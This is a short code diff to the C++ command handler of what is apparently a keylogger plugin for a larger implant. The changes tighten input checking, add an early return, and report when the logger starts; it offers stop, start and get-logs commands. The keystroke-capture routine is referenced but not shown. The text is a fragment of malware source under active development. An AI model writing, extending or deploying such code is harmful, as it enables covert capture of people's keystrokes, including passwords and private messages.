@@ -36,10 +36,11 @@ void startKeylogger()
 int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
 {
     int cmd = -1;
-    if (bufferSize < 1)
+    if (bufferSize != 1)
     {
         std::string msg{ "You must provide a command.\n\t0 = stop\n\t1 = start\n\t2 = get logs" };
         callback(msg.c_str(), msg.length());
+        return 0;
     }
     else
     {
@@ -74,7 +75,8 @@ int entrypoint(char* argsBuffer, uint32_t bufferSize, goCallback callback)
         {
             _queue = std::make_shared<SharedQueue>();
             messagePump = std::make_unique<std::thread>(&startKeylogger);
-            
+            std::string msg{ "Keylogger started" };
+            callback(msg.c_str(), msg.length());
         }
         break;
     case 2: // get logs
